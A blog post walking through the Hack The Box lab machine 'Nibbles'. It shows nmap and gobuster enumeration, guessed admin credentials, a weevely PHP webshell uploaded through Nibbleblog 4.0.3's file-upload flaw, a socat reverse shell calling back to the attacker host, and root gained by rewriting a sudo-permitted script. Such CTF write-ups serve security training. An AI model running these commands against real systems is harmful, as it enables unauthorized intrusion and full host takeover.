---
layout: post
title: "Hack the Box - Nibbles Write up"
date: 2018-05-09
description: "Write up for the Hack the box Machine Nibbles."
categories: [write-up, hackthebox]
tags: [writeup, pentesting, hackthebox]
---

## Introduction
![Nibbles](/assets/nibbles/1.png)

Nibbles was a pretty nice, refreshing, beginner-friendly box. It wasn't overly complex, but still had enough moving parts so that you were required for to think about what actions you were taking and why. 

## Tools Used 
- [Nmap](https://nmap.org/)
- [GoBuster](https://github.com/OJ/gobuster) 
- [Weevley3](https://github.com/epinna/weevely3)
- [socat](http://www.dest-unreach.org/socat/) 

## Enumeration
### Scanning

Like with every box Let's begin by scanning Nibbles at (10.10.10.75) with Nmap. 

```
root@dastinia:~/htb/nibbles# nmap -sV -sC -Pn 10.10.10.75 -oA nibbles_initial_scan
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 13:50 EDT
Nmap scan report for 10.10.10.75
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.83 seconds
```

The scan yields 2 open ports a webserver on port 80, and *SSH* on 22.

### Enumerating HTTP Port 80 (nibbleblog)

Visiting the web server on port 80 the text `Hello world`, and not much else from from a visual perspective. Taking a look at the source code of the page reveals a a comment in the code letting us know that there is `/nibbleblog/` directory.


![Nibbleblog comment left in page source](/assets/nibbles/2.png "Nibbleblog comment left in page source")


Going to the `/nibbleblog/` directory brings us to the main page of a blogging platform [NibbleBlog.](https://github.com/dignajar/nibbleblog)
![NibbleBlog Main Page](/assets/nibbles/3.png "NibbleBlog Main Page")


Hitting the site with `gobuster` in the reveals the following discoverable web content.

```
root@dastinia:~/htb/nibbles# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/ -x php,html -s 200,204,301,302,307,403 -t 100 | tee gobuster_nibbleblog
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.75/nibbleblog/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,403,200,204,301,302
[+] Extensions   : .php,.html
=====================================================
/content (Status: 301)
/index.php (Status: 200)
/themes (Status: 301)
/sitemap.php (Status: 200)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
```

Taking a look at the `README` file at `http://10.10.10.75/nibbleblog/README`, we can see that the current version of this blogging framework is: `version: v4.0.3`, and was released in 2014.

Searching for `Nibbleblog 4.0.3 exploit` or `Nibbleblog exploit` into google/searchsploit returns that this particular version of Nibbleblog is vulnerable to an `arbitrary file upload`, but requires authentication. So based on our prior information, it's safe to say that this will likely going to be our point of entry into the box. See a [write-up about the vulnerability here](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)


After some educated guessing you will discover that the credentials to authenticate to the nibbleblog admin panel is: `admin:nibbles`

I noticed a lot of people had issues with discovering what the admin panel credentials were. Normally for HTB boxes, if the login the credentials are guessable they usually look like:


```
admin:admin
admin:password
admin:{BOX_NAME}
{BOX_NAME}:{BOX_NAME}
{BOX_NAME}:password
{BOX_NAME}:admin
etc...
```
Usually if those don't work, then we likely have to dig deeper because there's some other clue that we need to find first.  

![Authenticating to the NibbleBlog Admin Panel](/assets/nibbles/5.png "Authenticating to the NibbleBlog Admin Panel")

## Exploitation

There is a Metasploit module for this vulnerability, but I opted to not use it because exploiting the vulnerability was simple enough, and I couldn't think of any notable benefits of using the Metasploit framework over doing it manually. 

From reading a description of the vulerbility report states that when uploading image files via the "My image" plugin nibbleblog keeps the original extension & doesn't check the file type or content of the file when uploaded. This is a textbook example of an arbitrary file upload vulnerability. My PHP webshell shell of choice is [weevley3](https://github.com/epinna/weevely3). Weevly3 adds a ton of extended functionality from a standard php webshell & improves the overall QoL of using php shells while pentesting. 


To exploit this vulnerbilty all we need to do is: 
1. authenticate to the admin panel 
2. Ensure that the "My image plugin" is enabled. 
3. Upload our PHP webshell. (In this case weevely3).


```
root@dastinia:~/htb/nibbles# weevely generate nibbles /root/htb/nibbles/nibbles.php 
Generated backdoor with password 'nibbles' in '/root/htb/nibbles/nibbles.php' of 1476 byte size.
```

```
root@dastinia:~/htb/nibbles# weevely http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php nibbles id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

root@dastinia:~/htb/nibbles# weevely http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php nibbles

[+] weevely 3.2.0

[+] Target:	nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image
[+] Session:	/root/.weevely/sessions/10.10.10.75/image_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> ls
db.xml
image.php

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image $ pwd 
/var/www/html/nibbleblog/content/private/plugins/my_image
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image $ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```

This box had a decent amount of activity at the time I was redoing it, when someone uploads a file using the "My Image Plugin" it will overwrite the `image.php` file, which started started to get pretty annoying, so I decided to upgrade to a socat shell instead. 

_my attack box_
```
root@dastinia:~/htb/nibbles# socat file:`tty`,raw,echo=0 tcp-listen:4545
```
_Nibbles box_
```
nibbler@Nibbles:/tmp $ wget -q 10.10.15.63:9999/socat
nibbler@Nibbles:/tmp $ chmod +x socat
nibbler@Nibbles:/tmp $ ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.63:4545
```


### Getting Root

First thing I usually do when I get on a box is to check if the current user is in sudoers/what can be ran as sudo by running `sudo -l`

```
nibbler@Nibbles:/home $ sudo -l 
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

From the sudo output it looks like we can run the shell script `monitor.sh` as root. 

Checking the permissions on the file it seems we have full control over it, so it should be an easy `root.txt`
We can replace `monitor.sh` with any shell script that we want to run as the root user. 


I made simple shell script that would spawn a new shell.  

```bash
#!/bin/sh
sh -c /bin/sh
```

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
#!/bin/sh
sh -c /bin/sh
nibbler@Nibbles:/home/nibbler/personal/stuff $ sudo -u root /home/nibbler/personal/stuff/monitor.sh

sudo: unable to resolve host Nibbles: Connection timed out
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
...[snip]...
```


